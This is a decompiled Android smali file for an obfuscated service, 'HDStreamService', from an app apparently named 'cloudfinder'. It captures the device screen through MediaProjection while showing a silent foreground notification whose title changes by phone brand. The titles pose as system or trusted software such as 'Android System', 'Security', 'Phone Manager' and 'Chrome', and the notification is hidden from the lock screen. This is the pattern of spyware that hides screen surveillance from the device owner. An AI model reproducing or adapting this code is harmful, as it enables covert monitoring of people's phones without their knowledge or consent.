.class public Lcom/lite/cloudfinder/hd/HDStreamService;
.super Landroid/app/Service;
.source "SourceFile"


# static fields
.field public static volatile ث:Z = false

.field public static final ج:[F


# instance fields
.field public ؋:Landroid/media/projection/MediaProjection;

.field public ؠ:Landroid/hardware/display/VirtualDisplay;

.field public ء:Landroid/media/ImageReader;

.field public آ:Landroid/os/HandlerThread;

.field public أ:Landroid/os/Handler;

.field public ؤ:I

.field public إ:I

.field public ئ:I

.field public ا:I

.field public ب:J

.field public volatile ة:Z

.field public ت:I


# direct methods
.method public static constructor <clinit>()V
    .locals 1

    const/16 v0, 0x14

    new-array v0, v0, [F

    fill-array-data v0, :array_0

    sput-object v0, Lcom/lite/cloudfinder/hd/HDStreamService;->ج:[F

    return-void

    :array_0
    .array-data 4
        0x41a00000    # 20.0f
        0x0
        0x0
        0x0
        0x42200000    # 40.0f
        0x0
        0x41a00000    # 20.0f
        0x0
        0x0
        0x42200000    # 40.0f
        0x0
        0x0
        0x41a00000    # 20.0f
        0x0
        0x42200000    # 40.0f
        0x0
        0x0
        0x0
        0x3f800000    # 1.0f
        0x0
    .end array-data
.end method

.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/16 v0, 0x1e0

    iput v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->ؤ:I

    const/16 v0, 0x356

    iput v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->إ:I

    const/16 v0, 0x19

    iput v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->ئ:I

    iput v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->ا:I

    const-wide/16 v0, 0x28

    iput-wide v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->ب:J

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->ة:Z

    const/4 v0, 0x1

    iput v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->ت:I

    return-void
.end method

.method public static ؋(Lcom/lite/cloudfinder/hd/HDStreamService;Landroid/graphics/Bitmap;)Landroid/graphics/Bitmap;
    .locals 5

    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-virtual {p1}, Landroid/graphics/Bitmap;->getConfig()Landroid/graphics/Bitmap$Config;

    move-result-object p0

    if-nez p0, :cond_0

    sget-object p0, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    :cond_0
    const/4 v0, 0x1

    invoke-virtual {p1, p0, v0}, Landroid/graphics/Bitmap;->copy(Landroid/graphics/Bitmap$Config;Z)Landroid/graphics/Bitmap;

    move-result-object p0

    new-instance v0, Landroid/graphics/Canvas;

    invoke-direct {v0, p0}, Landroid/graphics/Canvas;-><init>(Landroid/graphics/Bitmap;)V

    new-instance v1, Landroid/graphics/Paint;

    invoke-direct {v1}, Landroid/graphics/Paint;-><init>()V

    new-instance v2, Landroid/graphics/ColorMatrixColorFilter;

    new-instance v3, Landroid/graphics/ColorMatrix;

    sget-object v4, Lcom/lite/cloudfinder/hd/HDStreamService;->ج:[F

    invoke-direct {v3, v4}, Landroid/graphics/ColorMatrix;-><init>([F)V

    invoke-direct {v2, v3}, Landroid/graphics/ColorMatrixColorFilter;-><init>(Landroid/graphics/ColorMatrix;)V

    invoke-virtual {v1, v2}, Landroid/graphics/Paint;->setColorFilter(Landroid/graphics/ColorFilter;)Landroid/graphics/ColorFilter;

    const/4 v2, 0x0

    invoke-virtual {v0, p1, v2, v2, v1}, Landroid/graphics/Canvas;->drawBitmap(Landroid/graphics/Bitmap;FFLandroid/graphics/Paint;)V

    return-object p0
.end method


# virtual methods
.method public final onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public final onCreate()V
    .locals 2

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "HDStreamBg"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->آ:Landroid/os/HandlerThread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    new-instance v0, Landroid/os/Handler;

    iget-object v1, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->آ:Landroid/os/HandlerThread;

    invoke-virtual {v1}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->أ:Landroid/os/Handler;

    return-void
.end method

.method public final onDestroy()V
    .locals 1

    invoke-virtual {p0}, Lcom/lite/cloudfinder/hd/HDStreamService;->ؠ()V

    iget-object v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->آ:Landroid/os/HandlerThread;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/os/HandlerThread;->quitSafely()Z

    :cond_0
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public final onStartCommand(Landroid/content/Intent;II)I
    .locals 18

    move-object/from16 v1, p0

    move-object/from16 v0, p1

    const/4 v2, 0x2

    if-nez v0, :cond_0

    invoke-virtual/range {p0 .. p0}, Landroid/app/Service;->stopSelf()V

    return v2

    :cond_0
    invoke-virtual/range {p1 .. p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v3

    const-string v4, "stop"

    invoke-virtual {v4, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    invoke-virtual/range {p0 .. p0}, Lcom/lite/cloudfinder/hd/HDStreamService;->ؠ()V

    goto/16 :goto_1a

    :cond_1
    const-string v3, "notification"

    invoke-virtual {v1, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/NotificationManager;

    sget v4, Landroid/os/Build$VERSION;->SDK_INT:I

    new-instance v5, Landroid/app/NotificationChannel;

    const-string v6, "hd_stream_sys"

    const-string v7, " "

    const/4 v8, 0x1

    invoke-direct {v5, v6, v7, v8}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v7, ""

    invoke-virtual {v5, v7}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    const/4 v9, 0x0

    invoke-virtual {v5, v9}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    const/4 v10, 0x0

    invoke-virtual {v5, v10, v10}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    invoke-virtual {v5, v9}, Landroid/app/NotificationChannel;->enableLights(Z)V

    invoke-virtual {v5, v9}, Landroid/app/NotificationChannel;->enableVibration(Z)V

    const/4 v11, -0x1

    invoke-virtual {v5, v11}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    invoke-virtual {v3, v5}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v5

    invoke-virtual {v5}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v5

    const-string v11, "zh"

    invoke-virtual {v5, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    sget-object v11, Landroid/os/Build;->BRAND:Ljava/lang/String;

    if-eqz v11, :cond_2

    sget-object v7, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    invoke-virtual {v11, v7}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    move-result-object v7

    :cond_2
    const-string v11, "huawei"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    const-string v12, "Phone Manager"

    const-string v13, "\u624b\u673a\u7ba1\u5bb6"

    const-string v14, "\u8fd0\u884c\u4e2d"

    const-string v15, "Running"

    if-eqz v11, :cond_5

    new-array v7, v2, [Ljava/lang/String;

    if-eqz v5, :cond_3

    move-object v12, v13

    :cond_3
    aput-object v12, v7, v9

    if-eqz v5, :cond_4

    goto :goto_0

    :cond_4
    move-object v14, v15

    :goto_0
    aput-object v14, v7, v8

    goto/16 :goto_16

    :cond_5
    const-string v11, "xiaomi"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    const-string v16, "Security"

    if-nez v11, :cond_26

    const-string v11, "redmi"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_26

    const-string v11, "mi"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_26

    const-string v11, "poco"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_6

    goto/16 :goto_13

    :cond_6
    const-string v11, "oppo"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_23

    const-string v11, "realme"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_23

    const-string v11, "oneplus"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_7

    goto/16 :goto_11

    :cond_7
    const-string v11, "vivo"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_20

    const-string v11, "iqoo"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_8

    goto/16 :goto_e

    :cond_8
    const-string v11, "honor"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_1d

    const-string v11, "hihonor"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_9

    goto/16 :goto_b

    :cond_9
    const-string v11, "samsung"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    const-string v12, "Chrome"

    const-string v10, "   "

    if-eqz v11, :cond_a

    filled-new-array {v12, v10}, [Ljava/lang/String;

    move-result-object v7

    goto/16 :goto_16

    :cond_a
    const-string v11, "google"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_1c

    const-string v11, "pixel"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_b

    goto/16 :goto_8

    :cond_b
    const-string v11, "sony"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_c

    const-string v5, "Xperia Services"

    goto/16 :goto_9

    :cond_c
    const-string v11, "nokia"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_1c

    const-string v11, "hmd"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_d

    goto/16 :goto_8

    :cond_d
    const-string v11, "motorola"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_1b

    const-string v11, "moto"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_e

    goto/16 :goto_7

    :cond_e
    const-string v11, "tecno"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_1a

    const-string v11, "infinix"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_1a

    const-string v11, "itel"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_f

    goto :goto_6

    :cond_f
    const-string v11, "lenovo"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_12

    new-array v7, v2, [Ljava/lang/String;

    if-eqz v5, :cond_10

    const-string v16, "\u4e50\u5b89\u5168"

    :cond_10
    aput-object v16, v7, v9

    if-eqz v5, :cond_11

    goto :goto_1

    :cond_11
    move-object v14, v15

    :goto_1
    aput-object v14, v7, v8

    goto/16 :goto_16

    :cond_12
    const-string v11, "meizu"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_15

    new-array v7, v2, [Ljava/lang/String;

    if-eqz v5, :cond_13

    goto :goto_2

    :cond_13
    move-object/from16 v13, v16

    :goto_2
    aput-object v13, v7, v9

    if-eqz v5, :cond_14

    goto :goto_3

    :cond_14
    move-object v14, v15

    :goto_3
    aput-object v14, v7, v8

    goto/16 :goto_16

    :cond_15
    const-string v11, "zte"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-nez v11, :cond_17

    const-string v11, "nubia"

    invoke-virtual {v7, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_16

    goto :goto_4

    :cond_16
    filled-new-array {v12, v10}, [Ljava/lang/String;

    move-result-object v5

    goto :goto_a

    :cond_17
    :goto_4
    new-array v7, v2, [Ljava/lang/String;

    if-eqz v5, :cond_18

    const-string v16, "\u7cfb\u7edf\u5b89\u5168"

    :cond_18
    aput-object v16, v7, v9

    if-eqz v5, :cond_19

    goto :goto_5

    :cond_19
    move-object v14, v15

    :goto_5
    aput-object v14, v7, v8

    goto/16 :goto_16

    :cond_1a
    :goto_6
    const-string v5, "Phone Master"

    filled-new-array {v5, v15}, [Ljava/lang/String;

    move-result-object v5

    goto :goto_a

    :cond_1b
    :goto_7
    const-string v5, "Moto Services"

    goto :goto_9

    :cond_1c
    :goto_8
    const-string v5, "Android System"

    :goto_9
    filled-new-array {v5, v10}, [Ljava/lang/String;

    move-result-object v5

    :goto_a
    move-object v7, v5

    goto :goto_16

    :cond_1d
    :goto_b
    new-array v7, v2, [Ljava/lang/String;

    if-eqz v5, :cond_1e

    const-string v10, "\u7cfb\u7edf\u7ba1\u5bb6"

    goto :goto_c

    :cond_1e
    const-string v10, "System Manager"

    :goto_c
    aput-object v10, v7, v9

    if-eqz v5, :cond_1f

    goto :goto_d

    :cond_1f
    move-object v14, v15

    :goto_d
    aput-object v14, v7, v8

    goto :goto_16

    :cond_20
    :goto_e
    new-array v7, v2, [Ljava/lang/String;

    if-eqz v5, :cond_21

    const-string v10, "i\u7ba1\u5bb6"

    goto :goto_f

    :cond_21
    const-string v10, "iManager"

    :goto_f
    aput-object v10, v7, v9

    if-eqz v5, :cond_22

    goto :goto_10

    :cond_22
    move-object v14, v15

    :goto_10
    aput-object v14, v7, v8

    goto :goto_16

    :cond_23
    :goto_11
    new-array v7, v2, [Ljava/lang/String;

    if-eqz v5, :cond_24

    move-object v12, v13

    :cond_24
    aput-object v12, v7, v9

    if-eqz v5, :cond_25

    goto :goto_12

    :cond_25
    move-object v14, v15

    :goto_12
    aput-object v14, v7, v8

    goto :goto_16

    :cond_26
    :goto_13
    new-array v7, v2, [Ljava/lang/String;

    if-eqz v5, :cond_27

    goto :goto_14

    :cond_27
    move-object/from16 v13, v16

    :goto_14
    aput-object v13, v7, v9

    if-eqz v5, :cond_28

    goto :goto_15

    :cond_28
    move-object v14, v15

    :goto_15
    aput-object v14, v7, v8

    :goto_16
    aget-object v5, v7, v9

    aget-object v7, v7, v8

    new-instance v10, Landroid/app/Notification$Builder;

    invoke-direct {v10, v1, v6}, Landroid/app/Notification$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v10, v5}, Landroid/app/Notification$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v5

    invoke-virtual {v5, v7}, Landroid/app/Notification$Builder;->setContentText(Ljava/lang/CharSequence;)Landroid/app/Notification$Builder;

    move-result-object v5

    const v6, 0x1080041

    invoke-virtual {v5, v6}, Landroid/app/Notification$Builder;->setSmallIcon(I)Landroid/app/Notification$Builder;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroid/app/Notification$Builder;->setOngoing(Z)Landroid/app/Notification$Builder;

    move-result-object v5

    invoke-virtual {v5}, Landroid/app/Notification$Builder;->build()Landroid/app/Notification;

    move-result-object v5

    iget v6, v5, Landroid/app/Notification;->flags:I

    or-int/lit8 v6, v6, 0x20

    iput v6, v5, Landroid/app/Notification;->flags:I

    iput v9, v5, Landroid/app/Notification;->defaults:I

    const/4 v6, 0x0

    iput-object v6, v5, Landroid/app/Notification;->sound:Landroid/net/Uri;

    const/16 v6, 0x1d

    if-lt v4, v6, :cond_29

    invoke-static {v1, v5}, Lزءؽ۴ڰؠ/؋;->ا(Lcom/lite/cloudfinder/hd/HDStreamService;Landroid/app/Notification;)V

    goto :goto_17

    :cond_29
    const/16 v4, 0x2773

    invoke-virtual {v1, v4, v5}, Landroid/app/Service;->startForeground(ILandroid/app/Notification;)V

    :goto_17
    new-instance v4, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v5

    invoke-direct {v4, v5}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v5, Landroidx/constraintlayout/helper/widget/؋;

    const/16 v6, 0x19

    invoke-direct {v5, v6, v3}, Landroidx/constraintlayout/helper/widget/؋;-><init>(ILjava/lang/Object;)V

    const-wide/16 v10, 0x5dc

    invoke-virtual {v4, v5, v10, v11}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    const-string v3, "resultCode"

    invoke-virtual {v0, v3, v9}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v3

    const-string v4, "data"

    invoke-virtual {v0, v4}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object v4

    check-cast v4, Landroid/content/Intent;

    const-string v5, "width"

    const/16 v7, 0x1e0

    invoke-virtual {v0, v5, v7}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v5

    iput v5, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ؤ:I

    const-string v5, "height"

    const/16 v9, 0x356

    invoke-virtual {v0, v5, v9}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v5

    iput v5, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->إ:I

    const-string v5, "quality"

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v5

    iput v5, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ئ:I

    const-string v5, "fps"

    invoke-virtual {v0, v5, v6}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    iput v0, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ا:I

    const/16 v5, 0x3c

    invoke-static {v5, v0}, Ljava/lang/Math;->min(II)I

    move-result v0

    const/4 v5, 0x5

    invoke-static {v5, v0}, Ljava/lang/Math;->max(II)I

    move-result v0

    const/16 v5, 0x3e8

    div-int/2addr v5, v0

    int-to-long v5, v5

    iput-wide v5, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ب:J

    const-string v5, "HDStream"

    if-eqz v3, :cond_2e

    if-nez v4, :cond_2a

    goto/16 :goto_19

    :cond_2a
    const-string v0, "Streaming started "

    :try_start_0
    const-string v2, "media_projection"

    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/media/projection/MediaProjectionManager;

    invoke-virtual {v2, v3, v4}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object v2

    iput-object v2, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->؋:Landroid/media/projection/MediaProjection;

    if-nez v2, :cond_2b

    const-string v0, "getMediaProjection returned null"

    invoke-static {v5, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual/range {p0 .. p0}, Landroid/app/Service;->stopSelf()V

    goto/16 :goto_18

    :cond_2b
    new-instance v3, Lڟٿا۴/؋;

    invoke-direct {v3, v1}, Lڟٿا۴/؋;-><init>(Lcom/lite/cloudfinder/hd/HDStreamService;)V

    iget-object v4, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->أ:Landroid/os/Handler;

    invoke-virtual {v2, v3, v4}, Landroid/media/projection/MediaProjection;->registerCallback(Landroid/media/projection/MediaProjection$Callback;Landroid/os/Handler;)V

    new-instance v2, Landroid/util/DisplayMetrics;

    invoke-direct {v2}, Landroid/util/DisplayMetrics;-><init>()V

    const-string v3, "window"

    invoke-virtual {v1, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/WindowManager;

    invoke-interface {v3}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v3

    invoke-virtual {v3, v2}, Landroid/view/Display;->getRealMetrics(Landroid/util/DisplayMetrics;)V

    iget v3, v2, Landroid/util/DisplayMetrics;->densityDpi:I

    iput v3, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ت:I

    iget v3, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ؤ:I

    if-lez v3, :cond_2c

    iget v3, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->إ:I

    if-gtz v3, :cond_2d

    :cond_2c
    iget v3, v2, Landroid/util/DisplayMetrics;->widthPixels:I

    invoke-static {v3, v7}, Ljava/lang/Math;->min(II)I

    move-result v3

    iput v3, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ؤ:I

    iget v2, v2, Landroid/util/DisplayMetrics;->heightPixels:I

    invoke-static {v2, v9}, Ljava/lang/Math;->min(II)I

    move-result v2

    iput v2, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->إ:I

    :cond_2d
    iget v2, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ؤ:I

    iget v3, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->إ:I

    const/4 v4, 0x3

    invoke-static {v2, v3, v8, v4}, Landroid/media/ImageReader;->newInstance(IIII)Landroid/media/ImageReader;

    move-result-object v2

    iput-object v2, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ء:Landroid/media/ImageReader;

    new-instance v3, Lڟٿا۴/ؠ;

    invoke-direct {v3, v1}, Lڟٿا۴/ؠ;-><init>(Lcom/lite/cloudfinder/hd/HDStreamService;)V

    iget-object v4, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->أ:Landroid/os/Handler;

    invoke-virtual {v2, v3, v4}, Landroid/media/ImageReader;->setOnImageAvailableListener(Landroid/media/ImageReader$OnImageAvailableListener;Landroid/os/Handler;)V

    iget-object v9, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->؋:Landroid/media/projection/MediaProjection;

    const-string v10, "HDStream"

    iget v11, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ؤ:I

    iget v12, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->إ:I

    iget v13, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ت:I

    const/4 v14, 0x2

    iget-object v2, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ء:Landroid/media/ImageReader;

    invoke-virtual {v2}, Landroid/media/ImageReader;->getSurface()Landroid/view/Surface;

    move-result-object v15

    const/16 v16, 0x0

    iget-object v2, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->أ:Landroid/os/Handler;

    move-object/from16 v17, v2

    invoke-virtual/range {v9 .. v17}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v2

    iput-object v2, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ؠ:Landroid/hardware/display/VirtualDisplay;

    sput-boolean v8, Lcom/lite/cloudfinder/hd/HDStreamService;->ث:Z

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget v0, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ؤ:I

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, "x"

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v0, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->إ:I

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, " q="

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v0, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ئ:I

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, " fps="

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v0, v1, Lcom/lite/cloudfinder/hd/HDStreamService;->ا:I

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v5, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_18

    :catch_0
    move-exception v0

    const-string v2, "startStreaming error"

    invoke-static {v5, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    invoke-virtual/range {p0 .. p0}, Landroid/app/Service;->stopSelf()V

    :goto_18
    return v8

    :cond_2e
    :goto_19
    const-string v0, "No projection permission"

    invoke-static {v5, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :goto_1a
    invoke-virtual/range {p0 .. p0}, Landroid/app/Service;->stopSelf()V

    return v2
.end method

.method public final ؠ()V
    .locals 2

    const/4 v0, 0x0

    sput-boolean v0, Lcom/lite/cloudfinder/hd/HDStreamService;->ث:Z

    :try_start_0
    iget-object v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->ؠ:Landroid/hardware/display/VirtualDisplay;

    if-eqz v0, :cond_0

    invoke-virtual {v0}, Landroid/hardware/display/VirtualDisplay;->release()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    :try_start_1
    iget-object v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->ء:Landroid/media/ImageReader;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/media/ImageReader;->close()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :cond_1
    :try_start_2
    iget-object v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->؋:Landroid/media/projection/MediaProjection;

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Landroid/media/projection/MediaProjection;->stop()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    :cond_2
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->ؠ:Landroid/hardware/display/VirtualDisplay;

    iput-object v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->ء:Landroid/media/ImageReader;

    iput-object v0, p0, Lcom/lite/cloudfinder/hd/HDStreamService;->؋:Landroid/media/projection/MediaProjection;

    const-string v0, "HDStream"

    const-string v1, "Streaming stopped"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method
